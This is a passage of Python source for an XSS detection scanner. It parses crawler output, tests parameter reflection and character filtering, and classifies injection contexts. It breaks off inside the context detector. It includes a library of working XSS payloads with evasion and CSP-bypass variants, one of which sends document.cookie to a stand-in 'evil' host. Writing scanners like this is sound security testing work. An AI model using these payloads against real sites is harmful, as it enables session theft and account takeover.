#!/usr/bin/env python3
"""
XSsDetector - Rule-based XSS vulnerability detection module
Consumes Hellhound Spider JSON output and identifies reflected, stored,
and DOM-based XSS vulnerabilities with proof-based browser validation.
Only confirmed (browser-validated via dialog event) findings are reported.
"""

import json
import sys
import os
import re
import time
import uuid
import argparse
import datetime
import hashlib
import html
import urllib.parse
import concurrent.futures
import subprocess
import platform
import threading
import tempfile
import logging
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Set, Tuple
from copy import deepcopy
from enum import Enum
from collections import defaultdict

import requests
import urllib3

# Suppress Selenium logging
logging.getLogger('selenium').setLevel(logging.WARNING)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────────────────────
# ANSI colour helpers
# ─────────────────────────────────────────────────────────────────────────────
C_RESET   = "\033[0m"
C_BOLD    = "\033[1m"
C_RED     = "\033[91m"
C_GREEN   = "\033[92m"
C_YELLOW  = "\033[93m"
C_CYAN    = "\033[96m"
C_MAGENTA = "\033[95m"
C_GRAY    = "\033[90m"
C_DIM     = "\033[2m"

def red(s):     return f"{C_RED}{s}{C_RESET}"
def green(s):   return f"{C_GREEN}{s}{C_RESET}"
def yellow(s):  return f"{C_YELLOW}{s}{C_RESET}"
def cyan(s):    return f"{C_CYAN}{s}{C_RESET}"
def magenta(s): return f"{C_MAGENTA}{s}{C_RESET}"
def bold(s):    return f"{C_BOLD}{s}{C_RESET}"
def gray(s):    return f"{C_GRAY}{s}{C_RESET}"
def dim(s):     return f"{C_DIM}{s}{C_RESET}"

# Shared display width used for all section headers / rules / boxes so the
# terminal output has one consistent, professional look throughout the run.
LINE_WIDTH = 74

# ─────────────────────────────────────────────────────────────────────────────
# Snapshot Manager – global sequential numbering for all screenshots and DOM snapshots
# ─────────────────────────────────────────────────────────────────────────────
class SnapshotManager:
    """Central manager for sequential snapshot filenames."""
    def __init__(self, base_dir: str):
        self.base_dir = base_dir
        os.makedirs(base_dir, exist_ok=True)
        self._counter = 0
        self._lock = threading.Lock()

    def next_path(self, suffix: str, uid: str = "") -> str:
        """Return the next sequential file path."""
        with self._lock:
            self._counter += 1
            seq = self._counter
        if uid:
            name = f"{seq:04d}_{uid}{suffix}"
        else:
            name = f"{seq:04d}{suffix}"
        return os.path.join(self.base_dir, name)

# ─────────────────────────────────────────────────────────────────────────────
# Reflection type enum
# ─────────────────────────────────────────────────────────────────────────────
class ReflectionType(Enum):
    RAW         = "raw"          # Marker reflected unchanged
    ENCODED     = "encoded"      # Marker reflected but HTML/URL encoded
    TRANSFORMED = "transformed"  # Marker partially reflected / modified
    BLOCKED     = "blocked"      # Marker not reflected at all

# ─────────────────────────────────────────────────────────────────────────────
# Character filter result
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class CharFilterResult:
    """Result of character survivability analysis."""
    details: dict[str, str] = field(default_factory=dict)  # char -> "unchanged"|"encoded"|"blocked"

    @property
    def unchanged(self) -> list[str]:
        return [c for c, v in self.details.items() if v == "unchanged"]

    @property
    def encoded(self) -> list[str]:
        return [c for c, v in self.details.items() if v == "encoded"]

    @property
    def blocked(self) -> list[str]:
        return [c for c, v in self.details.items() if v == "blocked"]

    def is_available(self, char: str) -> bool:
        return self.details.get(char, "blocked") == "unchanged"

# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class InputPoint:
    """Represents a single testable input point extracted from spider output."""
    url:             str
    method:          str
    param:           str
    param_type:      str   # query | form | header | fragment | path | runtime | js | stored
    form_type:       str = "text"
    is_hidden:       bool = False
    form_action:     str = ""
    post_body:       dict = field(default_factory=dict)
    source:          list = field(default_factory=list)
    extra_headers:   dict = field(default_factory=dict)
    baseline_body:   str  = ""                         # Clean baseline response body
    reflected_body:  str  = ""                         # Marker-injected response body
    reflection_type: ReflectionType = ReflectionType.BLOCKED

@dataclass
class Finding:
    """Represents a confirmed XSS finding (browser dialog-validated only)."""
    url:              str
    method:           str
    param:            str
    param_type:       str
    context:          str        # HTML_BODY | HTML_ATTR | JS_STRING | JS_BLOCK | URL | DOM
    xss_type:         str        # Reflected XSS | Stored XSS | DOM-Based XSS
    payload:          str
    confidence:       str        # Always CONFIRMED
    confidence_score: int
    evidence:         str
    screenshot:       Optional[str] = None
    dom_snapshot:     Optional[str] = None
    severity:         str = "HIGH"
    impact:           str = "Session hijacking, credential theft, DOM manipulation"
    timestamp:        str = field(
        default_factory=lambda: datetime.datetime.now(datetime.timezone.utc).isoformat()
    )

# ─────────────────────────────────────────────────────────────────────────────
# Payload library – context-aware + CSP-bypass + encoding variants
# ─────────────────────────────────────────────────────────────────────────────
PAYLOADS = {
    "HTML_BODY": [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<math><mtext></table></math><img src=x onerror=alert(1)>",
        "</script><script>alert(1)</script>",
        # Encoding / evasion variants
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<svg/onload=alert&#40;1&#41;>",
        "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
        "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>",
        # CSP-bypass oriented
        "<script src=data:,alert(1)></script>",
        "<base href=//evil.example/>",
        "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    ],
    "HTML_ATTR_UNQUOTED": [
        " onmouseover=alert(1) x=",
        " onfocus=alert(1) autofocus ",
        " onerror=alert(1) src=x ",
        " onload=alert(1) ",
        " onpointerover=alert(1) ",
        " onanimationstart=alert(1) style=animation-name:x ",
    ],
    "HTML_ATTR_SINGLE": [
        "' onmouseover='alert(1)",
        "' onfocus='alert(1)' autofocus='",
        "'><script>alert(1)</script>",
        "' onerror='alert(1)' src='x",
        "' onpointerover='alert(1) x='",
    ],
    "HTML_ATTR_DOUBLE": [
        "\" onmouseover=\"alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "\"><script>alert(1)</script>",
        "\" onerror=\"alert(1)\" src=\"x",
        "\" onpointerover=\"alert(1) x=\"",
    ],
    "JS_STRING_SINGLE": [
        "';alert(1);//",
        "'-alert(1)-'",
        "\\';alert(1);//",
        "'+alert(1)+'",
        "';alert(document.domain)//",
        "';\\u0061lert(1);//",
    ],
    "JS_STRING_DOUBLE": [
        "\";alert(1);//",
        "\"-alert(1)-\"",
        "\\\";alert(1);//",
        "\"+alert(1)+\"",
        "\";alert(document.domain)//",
    ],
    "JS_BLOCK": [
        "</script><script>alert(1)</script>",
        "\nalert(1)\n",
        ";alert(1)//",
        "*/alert(1)/*",
        "\nalert(document.domain)\n",
    ],
    "URL": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "JaVaScRiPt:alert(1)",
        "javascript&#58;alert(1)",
        "javascript\x00:alert(1)",
        "java\tscript:alert(1)",
        "vbscript:alert(1)",
    ],
    "DOM": [
        "#\"><img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
        "#javascript:alert(1)",
        "';alert(1)//",
        "#\"><svg onload=alert(1)>",
        "#'-alert(1)-'",
        # Additional DOM-specific payloads
        "document.write('<img src=x onerror=alert(1)>')",
        "eval('alert(1)')",
        "setTimeout('alert(1)', 100)",
        "location='javascript:alert(1)'",
        "window['alert'](1)",
        "parent.alert(1)",
        "top.alert(1)",
        "self.alert(1)",
        "frames[0].alert(1)",
        "document.createElement('script').src='data:text/javascript,alert(1)'",
    ],
    "GENERIC": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"'><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
    ],
    "CSP_BYPASS": [
        "<script src=//example.com/></script>",
        "<link rel=stylesheet href='//evil/x.css'>",
        "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
        "<img src=x onerror=fetch('//evil/?c='+document.cookie)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<object data=javascript:alert(1)>",
    ],
}

# Characters probed during filter analysis – includes event handler separators
FILTER_PROBE_CHARS = [
    "<", ">", "'", "\"", "/", "=", "(", ")", "{", "}", ";", "`",
    # Event handler separators
    " ", "\t", "\n",
]

MARKER_TEMPLATE = "XSSDET{uid}"

# ─────────────────────────────────────────────────────────────────────────────
# Context label helper
# ─────────────────────────────────────────────────────────────────────────────
CONTEXT_LABELS = {
    "HTML_BODY":          "HTML Body Content",
    "HTML_ATTR_DOUBLE":   "HTML Attribute (double-quoted)",
    "HTML_ATTR_SINGLE":   "HTML Attribute (single-quoted)",
    "HTML_ATTR_UNQUOTED": "HTML Attribute (unquoted)",
    "JS_STRING_SINGLE":   "JavaScript String (single-quoted)",
    "JS_STRING_DOUBLE":   "JavaScript String (double-quoted)",
    "JS_BLOCK":           "JavaScript Block",
    "URL":                "URL Attribute (href/src)",
    "COMMENT":            "HTML Comment",
    "DOM":                "DOM Sink",
}

def context_label(context: str) -> str:
    return CONTEXT_LABELS.get(context, context)

# ─────────────────────────────────────────────────────────────────────────────
# XSS type badge helper
# ─────────────────────────────────────────────────────────────────────────────
def xss_type_badge(xss_type: str) -> str:
    if xss_type == "Reflected XSS":
        return f"{C_RED}{C_BOLD}[Reflected XSS]{C_RESET}"
    elif xss_type == "Stored XSS":
        return f"{C_MAGENTA}{C_BOLD}[Stored XSS]{C_RESET}"
    elif xss_type == "DOM-Based XSS":
        return f"{C_CYAN}{C_BOLD}[DOM-Based XSS]{C_RESET}"
    return f"{C_YELLOW}{C_BOLD}[{xss_type}]{C_RESET}"

# ─────────────────────────────────────────────────────────────────────────────
# Logger
# ─────────────────────────────────────────────────────────────────────────────
class Logger:
    """
    Handles all terminal + log-file output.

    Design notes:
      - `finding_box()` is the SINGLE, canonical place a confirmed
        vulnerability is rendered to the terminal. Callers must invoke it
        exactly once per finding (the orchestrator enforces this via its
        de-duplication set) so nothing is ever printed twice.
      - All free-text fields shown in the terminal (payload / evidence / url)
        are passed through `_truncate_line()` so a finding always renders on
        a single, readable line regardless of how long the underlying string
        is. The full, untruncated text is always written to the JSON/TXT
        reports by ReportGenerator — truncation only ever affects what is
        printed to the terminal / log file.
    """

    def __init__(self, verbose: bool = False, log_file: Optional[str] = None):
        self.verbose  = verbose
        self.log_file = log_file
        self._fh      = open(log_file, "w", encoding="utf-8") if log_file else None
        self._last_progress = False

    @staticmethod
    def _strip_ansi(msg: str) -> str:
        return re.sub(r'\x1b\[[0-9;]*m', '', msg)

    @staticmethod
    def _truncate_line(s: str, max_len: int = 90) -> str:
        """Collapse whitespace/newlines and truncate so the value always
        renders as a single terminal line."""
        if not s:
            return ""
        collapsed = " ".join(str(s).split())
        if len(collapsed) > max_len:
            return collapsed[: max_len - 1].rstrip() + "…"
        return collapsed

    def _write(self, msg: str):
        if self._fh:
            self._fh.write(msg + "\n")
            self._fh.flush()

    def _clear_progress(self):
        if self._last_progress:
            print("\r" + " " * 100 + "\r", end="", flush=True)
            self._last_progress = False

    def info(self, msg):
        self._clear_progress()
        print(f"  {msg}")
        self._write(self._strip_ansi(msg))

    def success(self, msg):
        self._clear_progress()
        print(f"  {green('✓')} {msg}")
        self._write(f"  [OK] {self._strip_ansi(msg)}")

    def warning(self, msg):
        self._clear_progress()
        print(f"  {yellow('!')} {msg}")
        self._write(f"  [WARN] {self._strip_ansi(msg)}")

    def error(self, msg):
        self._clear_progress()
        print(f"  {red('✗')} {msg}")
        self._write(f"  [ERR] {self._strip_ansi(msg)}")

    def finding_box(self, xss_type: str, param: str, param_type: str, url: str,
                     context: str, payload: str, evidence: str,
                     severity: str = "HIGH"):
        """
        Render a single confirmed-vulnerability box to the terminal and log
        file. This is the ONLY place a confirmed finding is displayed —
        callers must call this exactly once per finding.
        """
        self._clear_progress()
        rule        = "─" * LINE_WIDTH
        badge       = xss_type_badge(xss_type)
        url_ln      = self._truncate_line(url, LINE_WIDTH - 14)
        payload_ln  = self._truncate_line(payload, LINE_WIDTH - 14)
        evidence_ln = self._truncate_line(evidence, LINE_WIDTH - 14)
        sev_disp    = red(severity) if severity in ("CRITICAL", "HIGH") else yellow(severity)

        block = [
            "",
            f"  {C_RED}{rule}{C_RESET}",
            f"  {C_RED}{C_BOLD}✖ CONFIRMED{C_RESET}   {badge}",
            f"  {C_RED}{rule}{C_RESET}",
            f"    {bold('URL')}        {url_ln}",
            f"    {bold('Parameter')}  {param}  {dim(f'({param_type})')}",
            f"    {bold('Context')}    {context_label(context)}",
            f"    {bold('Payload')}    {dim(payload_ln)}",
            f"    {bold('Evidence')}   {dim(evidence_ln)}",
            f"    {bold('Severity')}   {sev_disp}",
            f"  {C_RED}{rule}{C_RESET}",
            "",
        ]
        print("\n".join(block))

        plain_rule = "=" * LINE_WIDTH
        plain = [
            "",
            f"  {plain_rule}",
            f"  CONFIRMED  [{xss_type}]",
            f"  {plain_rule}",
            f"    URL:       {url_ln}",
            f"    Parameter: {param} ({param_type})",
            f"    Context:   {context_label(context)}",
            f"    Payload:   {payload_ln}",
            f"    Evidence:  {evidence_ln}",
            f"    Severity:  {severity}",
            f"  {plain_rule}",
            "",
        ]
        self._write("\n".join(plain))

    def debug(self, msg):
        if self.verbose:
            self._clear_progress()
            print(f"  {dim(msg)}")
        self._write(f"  [DBG] {self._strip_ansi(msg)}")

    def section(self, title: str):
        self._clear_progress()
        rule = "─" * LINE_WIDTH
        print(f"\n  {C_CYAN}{rule}{C_RESET}")
        print(f"  {bold(title)}")
        print(f"  {C_CYAN}{rule}{C_RESET}")
        self._write(f"\n  {rule}\n  {title}\n  {rule}")

    def progress(self, current: int, total: int, label: str):
        pct     = int((current / total) * 100) if total else 0
        bar_len = 20
        filled  = int(bar_len * current / total) if total else 0
        bar     = "█" * filled + "░" * (bar_len - filled)
        label_ln = self._truncate_line(label, 60)
        line    = f"\r  {dim(f'[{bar}] {current}/{total} ({pct:>3}%)')} {label_ln}"
        print(line[:120], end="", flush=True)
        self._write(f"  [{current}/{total}] {label_ln}")
        self._last_progress = True

    def progress_done(self):
        if self._last_progress:
            print()
            self._last_progress = False

    def close(self):
        if self._fh:
            self._fh.close()

# ─────────────────────────────────────────────────────────────────────────────
# Hellhound Spider JSON parser
# ─────────────────────────────────────────────────────────────────────────────
class SpiderParser:
    """
    Parses Hellhound Spider JSON and extracts all testable input points.
    Handles: endpoints, js_routes, api_endpoints, websocket_endpoints,
             storage_endpoints, client_side_routes.
    """

    def __init__(self, json_path: str, logger: Logger):
        self.json_path   = json_path
        self.log         = logger
        self.data        = {}
        self.input_points: list[InputPoint] = []
        self.post_urls:   list[str] = []

    def load(self) -> bool:
        try:
            with open(self.json_path, "r", encoding="utf-8") as f:
                self.data = json.load(f)
            summary = self.data.get("summary", {})
            self.log.info(
                f"Loaded {bold(self.json_path)}  —  "
                f"{bold(str(summary.get('total_endpoints', '?')))} endpoints, "
                f"{green(str(summary.get('confirmed', '?')))} confirmed, "
                f"{yellow(str(summary.get('high', '?')))} high"
            )
            return True
        except (FileNotFoundError, json.JSONDecodeError) as e:
            self.log.error(f"Failed to load spider JSON: {e}")
            return False

    def parse(self) -> list[InputPoint]:
        """Extract all input points from the Hellhound spider JSON."""
        self.log.section("Parsing Spider Output")

        seen: set[str] = set()

        # ── Primary endpoints ───────────────────────────────────────────
        endpoints = self.data.get("endpoints", [])
        self.log.info(f"Processing {bold(str(len(endpoints)))} crawled endpoints")
        for ep in endpoints:
            self._parse_endpoint(ep, seen)

        # ── JS routes (client-side router paths) ───────────────────────
        js_routes = self.data.get("js_routes", [])
        if js_routes:
            self.log.info(f"Processing {bold(str(len(js_routes)))} JS routes")
        for route in js_routes:
            url    = route if isinstance(route, str) else route.get("url", "")
            method = "GET"
            if url:
                ip = InputPoint(url=url, method=method, param="fragment",
                                param_type="fragment")
                self._add(ip, seen)

        # ── API endpoints ───────────────────────────────────────────────
        api_endpoints = self.data.get("api_endpoints", [])
        if api_endpoints:
            self.log.info(f"Processing {bold(str(len(api_endpoints)))} API endpoints")
        for ep in api_endpoints:
            self._parse_endpoint(ep, seen)

        # ── WebSocket endpoints ─────────────────────────────────────────
        ws_endpoints = self.data.get("websocket_endpoints", [])
        if ws_endpoints:
            self.log.info(
                f"{dim(str(len(ws_endpoints)) + ' WebSocket endpoint(s) noted (not directly testable via HTTP)')}"
            )

        # ── Storage / client-side routes ────────────────────────────────
        storage_endpoints = self.data.get("storage_endpoints", [])
        if storage_endpoints:
            self.log.info(f"Processing {bold(str(len(storage_endpoints)))} storage endpoints")
        for ep in storage_endpoints:
            self._parse_endpoint(ep, seen)

        client_routes = self.data.get("client_side_routes", [])
        if client_routes:
            self.log.info(f"Processing {bold(str(len(client_routes)))} client-side routes")
        for route in client_routes:
            url = route if isinstance(route, str) else route.get("url", "")
            if url:
                ip = InputPoint(url=url, method="GET", param="fragment",
                                param_type="fragment")
                self._add(ip, seen)

        self.log.success(
            f"{bold(str(len(self.input_points)))} unique input points extracted  "
            f"({dim(str(len(self.post_urls)) + ' POST endpoint(s) for stored XSS')})"
        )
        return self.input_points

    # ------------------------------------------------------------------
    def _parse_endpoint(self, ep: dict, seen: set):
        url        = ep.get("url", "")
        method     = ep.get("method", "GET").upper()
        params_det = ep.get("params_detail", {})
        form_det   = ep.get("form_fields_detail", [])
        sources    = ep.get("source", [])

        form_meta: dict[str, dict] = {f["name"]: f for f in form_det}

        if method == "POST" and url and url not in self.post_urls:
            self.post_urls.append(url)

        # Query parameters
        for p in params_det.get("query", []):
            ip = InputPoint(url=url, method=method, param=p,
                            param_type="query", source=sources)
            self._add(ip, seen)

        # Form fields
        for p in params_det.get("form", []):
            meta      = form_meta.get(p, {})
            post_body = {
                k: (form_meta[k].get("value", "") if k in form_meta else "")
                for k in params_det.get("form", []) if k != p
            }
            ip = InputPoint(
                url=url, method=method, param=p, param_type="form",
                form_type=meta.get("type", "text"),
                is_hidden=meta.get("hidden", False),
                post_body=post_body, source=sources,
            )
            self._add(ip, seen)

        # Runtime / JS parameters
        for p in params_det.get("runtime", []):
            ip = InputPoint(url=url, method=method, param=p,
                            param_type="runtime", source=sources)
            self._add(ip, seen)

        for p in params_det.get("js", []):
            ip = InputPoint(url=url, method=method, param=p,
                            param_type="js", source=sources)
            self._add(ip, seen)

        # Header parameters
        for p in params_det.get("headers", []):
            ip = InputPoint(url=url, method=method, param=p,
                            param_type="header", source=sources)
            self._add(ip, seen)

        # URL fragment
        parsed = urllib.parse.urlparse(url)
        if parsed.fragment:
            ip = InputPoint(url=url, method=method, param="fragment",
                            param_type="fragment", source=sources)
            self._add(ip, seen)

    # ------------------------------------------------------------------
    def _add(self, ip: InputPoint, seen: set):
        key = f"{ip.method}|{ip.url}|{ip.param}|{ip.param_type}"
        if key not in seen:
            seen.add(key)
            self.input_points.append(ip)

    def get_response_headers(self) -> dict:
        return self.data.get("target_response_headers", {})

    def get_target_base(self) -> str:
        return self.data.get("meta", {}).get("target", "")

    def get_all_urls(self) -> list[str]:
        """Return all unique URLs seen by the spider (for Stored XSS revisit)."""
        urls: list[str] = []
        for ep in self.data.get("endpoints", []):
            u = ep.get("url", "")
            if u and u not in urls:
                urls.append(u)
        return urls

    def get_endpoints(self) -> list[dict]:
        """Return all endpoints from the spider data."""
        return self.data.get("endpoints", [])

# ─────────────────────────────────────────────────────────────────────────────
# HTTP helper
# ─────────────────────────────────────────────────────────────────────────────
class HTTPClient:
    def __init__(self, timeout: int = 10, delay: float = 0.2,
                 headers: Optional[dict] = None, logger: Optional[Logger] = None):
        self.timeout = timeout
        self.delay   = delay
        self.log     = logger
        self.session = requests.Session()
        self.session.verify = False
        base_headers = {
            "User-Agent": (
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
            ),
            "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if headers:
            base_headers.update(headers)
        self.session.headers.update(base_headers)

    def get(self, url: str, params: Optional[dict] = None,
            extra_headers: Optional[dict] = None) -> Optional[requests.Response]:
        try:
            time.sleep(self.delay)
            return self.session.get(url, params=params, timeout=self.timeout,
                                    allow_redirects=True,
                                    headers=extra_headers or {})
        except requests.RequestException:
            return None

    def post(self, url: str, data: Optional[dict] = None,
             params: Optional[dict] = None,
             extra_headers: Optional[dict] = None) -> Optional[requests.Response]:
        try:
            time.sleep(self.delay)
            return self.session.post(url, data=data, params=params,
                                     timeout=self.timeout, allow_redirects=True,
                                     headers=extra_headers or {})
        except requests.RequestException:
            return None

    def request(self, method: str, url: str,
                params: Optional[dict] = None,
                data: Optional[dict] = None,
                extra_headers: Optional[dict] = None) -> Optional[requests.Response]:
        if method.upper() == "POST":
            return self.post(url, data=data, params=params,
                             extra_headers=extra_headers)
        return self.get(url, params=params, extra_headers=extra_headers)

# ─────────────────────────────────────────────────────────────────────────────
# Endpoint validator
# ─────────────────────────────────────────────────────────────────────────────
class EndpointValidator:
    """Validates reachability, confirms parameter reflection, and captures
    clean baseline responses for later comparison."""

    def __init__(self, http: HTTPClient, logger: Logger):
        self.http = http
        self.log  = logger

    def is_reachable(self, url: str, method: str = "GET",
                     extra_headers: Optional[dict] = None) -> bool:
        resp = self.http.request(method, url, extra_headers=extra_headers)
        return resp is not None and resp.status_code < 500

    def _get_baseline(self, ip: InputPoint) -> Optional[str]:
        """Get clean baseline response body (no injection)."""
        parsed    = urllib.parse.urlparse(ip.url)
        clean_url = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        if ip.param_type == "header":
            resp = self.http.get(clean_url, extra_headers=ip.extra_headers)
        elif ip.param_type in ("query", "runtime", "js"):
            resp = self.http.get(clean_url, extra_headers=ip.extra_headers)
        elif ip.param_type == "form" and ip.method == "POST":
            body = deepcopy(ip.post_body)
            body[ip.param] = ""
            resp = self.http.post(clean_url, data=body,
                                  extra_headers=ip.extra_headers)
        else:
            resp = self.http.get(clean_url, extra_headers=ip.extra_headers)

        return resp.text if resp else None

    def check_reflection(self, ip: InputPoint) -> tuple[Optional[str], Optional[str]]:
        """Send a harmless unique marker; return (baseline_body, reflected_body)
        if marker is reflected, else (baseline_body, None)."""
        marker    = MARKER_TEMPLATE.format(uid=uuid.uuid4().hex[:8].upper())
        parsed    = urllib.parse.urlparse(ip.url)
        clean_url = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        # ── Baseline (clean) response ───────────────────────────────────
        baseline_body = self._get_baseline(ip)

        # ── Marker-injected response ────────────────────────────────────
        if ip.param_type == "header":
            resp = self.http.get(
                clean_url,
                extra_headers={**ip.extra_headers, ip.param: marker}
            )
        elif ip.param_type in ("query", "runtime", "js"):
            resp = self.http.get(clean_url, params={ip.param: marker},
                                 extra_headers=ip.extra_headers)
        elif ip.param_type == "form" and ip.method == "POST":
            body = deepcopy(ip.post_body)
            body[ip.param] = marker
            resp = self.http.post(clean_url, data=body,
                                  extra_headers=ip.extra_headers)
        elif ip.param_type == "form":
            resp = self.http.get(clean_url, params={ip.param: marker},
                                 extra_headers=ip.extra_headers)
        else:
            return baseline_body, None

        if resp is None:
            return baseline_body, None

        if marker in resp.text:
            return baseline_body, resp.text

        # Check for encoded reflection (URL or HTML encoding of the marker)
        encoded_marker = urllib.parse.quote(marker, safe="")
        if encoded_marker in resp.text:
            return baseline_body, resp.text

        html_encoded_marker = html.escape(marker)
        if html_encoded_marker != marker and html_encoded_marker in resp.text:
            return baseline_body, resp.text

        return baseline_body, None

    def validate_batch(
        self, input_points: list[InputPoint], threads: int = 1
    ) -> tuple[list[InputPoint], list[InputPoint]]:
        self.log.section("Validating Endpoints & Parameters")
        valid:    list[InputPoint] = []
        skipped:  list[InputPoint] = []
        seen_urls: dict[str, Optional[bool]] = {}
        lock = threading.Lock()

        total = len(input_points)

        def _check(args):
            i, ip = args
            if ip.is_hidden:
                return i, ip, "skip_hidden"

            cache_key = f"{ip.method}|{ip.url}"
            with lock:
                if cache_key not in seen_urls:
                    seen_urls[cache_key] = None

            if seen_urls[cache_key] is None:
                reachable = self.is_reachable(ip.url, ip.method, ip.extra_headers)
                with lock:
                    seen_urls[cache_key] = reachable

            if not seen_urls[cache_key]:
                return i, ip, "unreachable"

            baseline_body, reflected_body = self.check_reflection(ip)
            ip.baseline_body = baseline_body or ""
            if reflected_body is not None:
                ip.reflected_body = reflected_body
                return i, ip, "valid"
            return i, ip, "no_reflect"

        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
            futures = {ex.submit(_check, (i, ip)): i
                       for i, ip in enumerate(input_points, 1)}
            done = 0
            for fut in concurrent.futures.as_completed(futures):
                done += 1
                i, ip, status = fut.result()
                self.log.progress(done, total,
                                  f"{ip.method} {ip.param} @ {ip.url[:55]}")
                results.append((i, ip, status))

        self.log.progress_done()
        results.sort(key=lambda x: x[0])

        for _, ip, status in results:
            if status == "valid":
                valid.append(ip)
            else:
                skipped.append(ip)

        self.log.success(
            f"{bold(str(len(valid)))} parameters reflect input  ·  "
            f"{dim(str(len(skipped)) + ' skipped')}"
        )
        return valid, skipped

# ─────────────────────────────────────────────────────────────────────────────
# Filter analyser
# ─────────────────────────────────────────────────────────────────────────────
class FilterAnalyser:
    """Probes which special characters survive reflection and whether
    they are unchanged, encoded, or blocked."""

    def __init__(self, http: HTTPClient, logger: Logger):
        self.http = http
        self.log  = logger

    def analyse(self, ip: InputPoint) -> CharFilterResult:
        result   = CharFilterResult()
        parsed    = urllib.parse.urlparse(ip.url)
        clean_url = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        for ch in FILTER_PROBE_CHARS:
            uid    = uuid.uuid4().hex[:6]
            marker = f"XSSDET{uid}X{ch}X"

            if ip.param_type == "header":
                resp = self.http.get(
                    clean_url,
                    extra_headers={**ip.extra_headers, ip.param: marker}
                )
            elif ip.param_type in ("query", "runtime", "js"):
                resp = self.http.get(clean_url, params={ip.param: marker},
                                     extra_headers=ip.extra_headers)
            elif ip.param_type == "form" and ip.method == "POST":
                body = deepcopy(ip.post_body)
                body[ip.param] = marker
                resp = self.http.post(clean_url, data=body,
                                      extra_headers=ip.extra_headers)
            else:
                resp = self.http.get(clean_url, params={ip.param: marker},
                                     extra_headers=ip.extra_headers)

            if resp is None:
                result.details[ch] = "blocked"
                continue

            uid_prefix = f"XSSDET{uid}"
            if uid_prefix not in resp.text:
                result.details[ch] = "blocked"
                continue

            # Find the region near the marker to check character status
            idx   = resp.text.find(uid_prefix)
            region = resp.text[idx:idx + len(marker) + 40]

            if ch in region:
                result.details[ch] = "unchanged"
            else:
                # Check for HTML-encoded version
                encoded_ch = html.escape(ch)
                if encoded_ch and encoded_ch in region:
                    result.details[ch] = "encoded"
                # Check for URL-encoded version
                elif urllib.parse.quote(ch, safe="") in region:
                    result.details[ch] = "encoded"
                else:
                    result.details[ch] = "blocked"

        self.log.debug(
            f"Filter: {ip.param} — "
            f"unchanged: {''.join(result.unchanged) or 'none'}  "
            f"encoded: {''.join(result.encoded) or 'none'}  "
            f"blocked: {''.join(result.blocked) or 'none'}"
        )
        return result

    @staticmethod
    def determine_reflection_type(char_filter: CharFilterResult,
                                   marker_reflected: bool) -> ReflectionType:
        """Derive overall reflection type from character filter results."""
        if not marker_reflected:
            return ReflectionType.BLOCKED

        has_encoded   = len(char_filter.encoded) > 0
        has_blocked   = len(char_filter.blocked) > 0

        if has_encoded:
            return ReflectionType.ENCODED
        elif has_blocked:
            return ReflectionType.TRANSFORMED
        else:
            return ReflectionType.RAW

# ─────────────────────────────────────────────────────────────────────────────
# Context detector
# ─────────────────────────────────────────────────────────────────────────────
class ContextDetector:
    """Identifies the injection context from the reflected response.
    Uses baseline comparison to pinpoint the reflection region."""

    CONTEXT_HTML_BODY    = "HTML_BODY"
    CONTEXT_HTML_ATTR_DQ = "HTML_ATTR_DOUBLE"
    CONTEXT_HTML_ATTR_SQ = "HTML_ATTR_SINGLE"
    CONTEXT_HTML_ATTR_UQ = "HTML_ATTR_UNQUOTED"
    CONTEXT_JS_STR_SQ    = "JS_STRING_SINGLE"
    CONTEXT_JS_STR_DQ    = "JS_STRING_DOUBLE"
    CONTEXT_JS_BLOCK     = "JS_BLOCK"
    CONTEXT_URL          = "URL"
    CONTEXT_COMMENT      = "COMMENT"
    CONTEXT_DOM          = "DOM"

    def detect(self, body: str, marker: str,
               baseline: str = "") -> str:
        if marker not in body:
            return self.CONTEXT_DOM

        idx           = body.find(marker)
        snippet_start = max(0, idx - 300)
        surroundings  = body[snippet_start: idx + len(marker) + 300]

        # If we have a baseline, narrow context to the diff region
        if baseline and baseline != body:
            surroundings = self._narrow_to_diff(baseline, body, marker, surroundings)

        # HTML comment context
        if re.search(r'<!--.*?' + re.escape(marker), surroundings, re.DOTALL):
            return self.CONTEXT_COMMENT

        # JavaScript block — inside <script>…</script>
        script_match = re.search(
            r'<script(?:[^>]*)>(.*?)' + re.escape(marker),
            surroundings, re.DOTALL | re.IGNORECASE
        )
        if script_match:
            inner = script_match.group(1)
            tail  = inner[-100:]
            if tail.count("'") % 2:
                return self.CONTEXT_JS_STR_SQ
            if tail.count('"') % 2:
                return self.CONTEXT_JS_STR_DQ
            return self.CONTEXT_JS_BLOCK

        # Double-quoted attribute
        if re.search(r'=\s*"[^"]*' + re.escape(marker), surroundings):
            # Check if it's a URL attribute
            if re.search(
